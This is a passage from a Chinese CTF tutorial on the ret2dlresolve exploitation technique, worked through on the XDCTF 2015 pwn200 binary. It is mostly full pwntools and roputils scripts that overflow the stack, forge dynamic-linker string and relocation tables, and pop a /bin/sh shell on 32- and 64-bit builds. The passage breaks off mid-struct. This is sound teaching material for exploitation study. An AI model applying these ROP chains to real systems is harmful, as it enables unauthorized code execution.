<p>思路 2 - 间接控制重定位表项的相关内容</p>
<p>既然动态链接器会从 <code>.dynamic</code> 节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。</p>
<p>思路 3 - 伪造 link_map</p>
<p>由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。</p>
<p>下面我们以 2015-XDCTF-pwn200 来介绍 32 位和 64 位下如何使用 ret2dlresolve 技巧。</p>
<h4 id="32位，NO-RELRO"><a href="#32位，NO-RELRO" class="headerlink" title="32位，NO RELRO"></a>32位，NO RELRO</h4><p>在这种情况下，修改 <code>.dynamic</code> 会简单些。因为我们只需要修改 <code>.dynamic</code> 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下</p>
<ol>
<li>修改 .dynamic 节中字符串表的地址为伪造的地址</li>
<li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li>
<li>在特定的位置读取 /bin/sh 字符串。</li>
<li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而执行 system 函数。</li>
</ol>
<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level="debug"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">context.arch=<span class="string">"i386"</span></span><br><span class="line">p = process(<span class="string">"./main_no_relro_32"</span>)</span><br><span class="line">rop = ROP(<span class="string">"./main_no_relro_32"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./main_no_relro_32"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*<span class="string">'a'</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x08049804</span>+<span class="number">4</span>,<span class="number">4</span>) <span class="comment"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">"read"</span>,<span class="string">"system"</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>,len((dynstr))) <span class="comment"># construct a fake dynstr section</span></span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>+<span class="number">0x100</span>,len(<span class="string">"/bin/sh\x00"</span>)) <span class="comment"># read /bin/sh\x00</span></span><br><span class="line">rop.raw(<span class="number">0x08048376</span>) <span class="comment"># the second instruction of read@plt </span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(<span class="number">0x080498E0</span>+<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"><span class="keyword">assert</span>(len(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">"a"</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(p32(<span class="number">0x080498E0</span>))</span><br><span class="line">p.send(dynstr)</span><br><span class="line">p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="32位，Partial-RELRO"><a href="#32位，Partial-RELRO" class="headerlink" title="32位，Partial RELRO"></a>32位，Partial RELRO</h4><p>基于工具伪造</p>
<p>使用 roputil 来进行攻击。代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_runtimeresolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>关于 dl_resolve_call 与 dl_resolve_data 的具体细节请参考 roputils.py 的源码，比较容易理解。需要注意的是，dl_resolve 执行完之后也是需要有对应的返回地址的。</p>
<p>使用 pwntools 的工具进行攻击。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">"./main_partial_relro_32"</span>)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">"system"</span>,args=[<span class="string">"/bin/sh"</span>])</span><br><span class="line"><span class="comment"># pwntools will help us choose a proper addr</span></span><br><span class="line"><span class="comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">io = process(<span class="string">"./main_partial_relro_32"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Welcome to XDCTF2015~!\n"</span>)</span><br><span class="line">payload = flat(&#123;<span class="number">112</span>:raw_rop,<span class="number">256</span>:dlresolve.payload&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="32位，Full-RELRO"><a href="#32位，Full-RELRO" class="headerlink" title="32位，Full RELRO"></a>32位，Full RELRO</h4><p>在开启 FULL RELRO 保护的情况下，程序中导入的函数地址会在程序开始执行之前被解析完毕，因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT 表中的这两个地址均为 0。此时，直接使用上面的技巧是不行的。</p>
<h4 id="64位，NO-RELRO"><a href="#64位，NO-RELRO" class="headerlink" title="64位，NO RELRO"></a>64位，NO RELRO</h4><p>在这种情况下，类似于 32 位的情况直接构造即可。由于可以溢出的缓冲区太少，所以我们可以考虑进行栈迁移后，然后进行漏洞利用。</p>
<ol>
<li>在 bss 段伪造栈。栈中的数据为<ol>
<li>修改 .dynamic 节中字符串表的地址为伪造的地址</li>
<li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li>
<li>在特定的位置读取 /bin/sh 字符串。</li>
<li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而触发执行 system 函数。</li>
</ol>
</li>
<li>栈迁移到 bss 段。</li>
</ol>
<p>由于程序中没有直接设置 rdx 的 gadget，所以我们这里就选择了万能 gadget。这会使得我们的 ROP 链变得更长</p>
<p>经过精细的调节，我们还是避免破坏 .dynamic 节的内容</p>
<ul>
<li>修改迁移后的栈的地址为 bss_addr+0x200，即 0x600d30</li>
<li>修改迁移后的栈的大小为 0x188</li>
</ul>
<p>简单地调整一下栈，来使得栈是 16 字节对齐的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level="debug"</span></span><br><span class="line"><span class="comment"># context.terminal = ["tmux","splitw","-h"]</span></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line">io = process(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line">rop = ROP(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x400750</span></span><br><span class="line">csu_end_addr = <span class="number">0x40076A</span></span><br><span class="line">leave_ret  =<span class="number">0x40063c</span></span><br><span class="line">poprbp_ret = <span class="number">0x400588</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack privot to bss segment, set rsp = new_stack</span></span><br><span class="line">stack_size = <span class="number">0x1a0</span> <span class="comment"># new stack size is 0x1a0</span></span><br><span class="line">new_stack = bss_addr+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(offset*<span class="string">'a'</span>)</span><br><span class="line">payload1 = csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,new_stack,stack_size)</span><br><span class="line">rop.raw(payload1)</span><br><span class="line">rop.raw(<span class="number">0x400607</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">"a"</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake stack</span></span><br><span class="line">rop = ROP(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,<span class="number">0x600988</span>+<span class="number">8</span>,<span class="number">8</span>))  <span class="comment"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">"read"</span>,<span class="string">"system"</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,<span class="number">0x600B30</span>,len(dynstr)))  <span class="comment"># construct a fake dynstr section</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,<span class="number">0x600B30</span>+len(dynstr),len(<span class="string">"/bin/sh\x00"</span>)))  <span class="comment"># read /bin/sh\x00</span></span><br><span class="line">rop.raw(<span class="number">0x0000000000400771</span>) <span class="comment">#pop rsi; pop r15; ret; </span></span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="number">0x0000000000400773</span>) <span class="comment"># pop rdi; ret</span></span><br><span class="line">rop.raw(<span class="number">0x600B30</span>+len(dynstr))</span><br><span class="line">rop.raw(<span class="number">0x400516</span>) <span class="comment"># the second instruction of read@plt </span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment"># print(len(rop.chain()))</span></span><br><span class="line">rop.raw(<span class="string">'a'</span>*(stack_size-len(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># reuse the vuln to stack pivot</span></span><br><span class="line">rop = ROP(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line">rop.raw(offset*<span class="string">'a'</span>)</span><br><span class="line">rop.migrate(new_stack)</span><br><span class="line"><span class="keyword">assert</span>(len(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">io.send(rop.chain()+<span class="string">'a'</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># now, we are on the new stack</span></span><br><span class="line">io.send(p64(<span class="number">0x600B30</span>)) <span class="comment"># fake dynstr location</span></span><br><span class="line">io.send(dynstr) <span class="comment"># fake dynstr</span></span><br><span class="line">io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>到了这里我们发现，与 32 位不同，在 64 位下进行栈迁移然后利用 ret2dlresolve 攻击需要精心构造栈的位置，以避免破坏 .dynamic 节的内容。</p>
<p>这里我们同时给出另外一种方法，即通过多次使用 vuln 函数进行漏洞利用。这种方式看起来会更加清晰一些。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level="debug"</span></span><br><span class="line"><span class="comment"># context.terminal = ["tmux","splitw","-h"]</span></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line">io = process(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">print(hex(bss_addr))</span><br><span class="line">csu_front_addr = <span class="number">0x400750</span></span><br><span class="line">csu_end_addr = <span class="number">0x40076A</span></span><br><span class="line">leave_ret  =<span class="number">0x40063c</span></span><br><span class="line">poprbp_ret = <span class="number">0x400588</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack privot to bss segment, set rsp = new_stack</span></span><br><span class="line">stack_size = <span class="number">0x200</span> <span class="comment"># new stack size is 0x200</span></span><br><span class="line">new_stack = bss_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">rop = ROP(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(offset*<span class="string">'a'</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,<span class="number">0x600988</span>+<span class="number">8</span>,<span class="number">8</span>))  </span><br><span class="line">rop.raw(<span class="number">0x400607</span>)</span><br><span class="line">rop.raw(<span class="string">"a"</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line">print(rop.dump())</span><br><span class="line">print(len(rop.chain()))</span><br><span class="line"><span class="keyword">assert</span>(len(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">"a"</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(p64(<span class="number">0x600B30</span>+<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct a fake dynstr section</span></span><br><span class="line">rop = ROP(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line">rop.raw(offset*<span class="string">'a'</span>)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">"read"</span>,<span class="string">"system"</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,<span class="number">0x600B30</span>+<span class="number">0x100</span>,len(dynstr)))  </span><br><span class="line">rop.raw(<span class="number">0x400607</span>)</span><br><span class="line">rop.raw(<span class="string">"a"</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(dynstr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read /bin/sh\x00</span></span><br><span class="line">rop = ROP(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line">rop.raw(offset*<span class="string">'a'</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,<span class="number">0x600B30</span>+<span class="number">0x100</span>+len(dynstr),len(<span class="string">"/bin/sh\x00"</span>)))  </span><br><span class="line">rop.raw(<span class="number">0x400607</span>)</span><br><span class="line">rop.raw(<span class="string">"a"</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">"./main_no_relro_64"</span>)</span><br><span class="line">rop.raw(offset*<span class="string">'a'</span>)</span><br><span class="line">rop.raw(<span class="number">0x0000000000400771</span>) <span class="comment">#pop rsi; pop r15; ret; </span></span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="number">0x0000000000400773</span>)</span><br><span class="line">rop.raw(<span class="number">0x600B30</span>+<span class="number">0x100</span>+len(dynstr))</span><br><span class="line">rop.raw(<span class="number">0x400516</span>) <span class="comment"># the second instruction of read@plt </span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line">print(rop.dump())</span><br><span class="line">print(len(rop.chain()))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="64位，Partial-RELRO"><a href="#64位，Partial-RELRO" class="headerlink" title="64位，Partial RELRO"></a>64位，Partial RELRO</h4><p>手工伪造</p>
<p>64 位的变化</p>
<p>glibc 中默认编译使用的是 <code>ELF_Rela</code> 来记录重定位项的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure>

<p>这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 字节。</p>
<p>根据 IDA 里的重定位表的信息可以知道，write 函数在符号表中的偏移为 1（0x100000007h&gt;&gt;32） 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000400488 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:0000000000400488                 Elf64_Rela &lt;601018h, 100000007h, 0&gt; ; R_X86_64_JUMP_SLOT write</span><br><span class="line">LOAD:00000000004004A0                 Elf64_Rela &lt;601020h, 200000007h, 0&gt; ; R_X86_64_JUMP_SLOT strlen</span><br><span class="line">LOAD:00000000004004B8                 Elf64_Rela &lt;601028h, 300000007h, 0&gt; ; R_X86_64_JUMP_SLOT setbuf</span><br><span class="line">LOAD:00000000004004D0                 Elf64_Rela &lt;601030h, 400000007h, 0&gt; ; R_X86_64_JUMP_SLOT read</span><br><span class="line">LOAD:00000000004004D0 LOAD            ends</span><br></pre></td></tr></table></figure>

<p>确实在符号表中的偏移为 1。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000000004002C0 ; ELF Symbol Table</span><br><span class="line">LOAD:00000000004002C0      Elf64_Sym &lt;0&gt;</span><br><span class="line">LOAD:00000000004002D8      Elf64_Sym &lt;offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:00000000004002F0      Elf64_Sym &lt;offset aStrlen - offset byte_400398, 12h, 0, 0, 0, 0&gt; ; &quot;strlen&quot;</span><br><span class="line">LOAD:0000000000400308      Elf64_Sym &lt;offset aSetbuf - offset byte_400398, 12h, 0, 0, 0, 0&gt; ; &quot;setbuf&quot;</span><br><span class="line">LOAD:0000000000400320      Elf64_Sym &lt;offset aRead - offset byte_400398, 12h, 0, 0, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>在 64 位下，Elf64_Sym 结构体为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index 